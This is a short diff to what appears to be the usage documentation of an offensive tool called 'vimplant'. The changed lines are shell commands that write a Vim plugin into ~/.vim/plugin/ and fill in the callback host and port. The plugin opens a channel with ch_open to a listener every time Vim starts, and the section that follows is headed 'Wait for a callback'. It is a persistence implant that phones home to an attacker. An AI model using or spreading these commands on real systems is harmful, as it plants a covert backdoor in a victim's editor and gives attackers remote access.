@@ -22,8 +22,8 @@ options:
 ```
 mkdir -p ~/.vim/plugin/
 echo ":let handle = ch_open('LHOST:LPORT')" > ~/.vim/plugin/vimplant.vim
-sed -i 's:<CALLBACK_HOST>:LHOST:'> ~/.vim/plugin/vimplant.vim
-sed -i 's:<CALLBACK_PORT>:LPORT:'> ~/.vim/plugin/vimplant.vim
+sed -i 's:LHOST:<CALLBACK_HOST>:' ~/.vim/plugin/vimplant.vim
+sed -i 's:LPORT:<CALLBACK_PORT>:' ~/.vim/plugin/vimplant.vim
 ```
 
 ## Wait for a callback
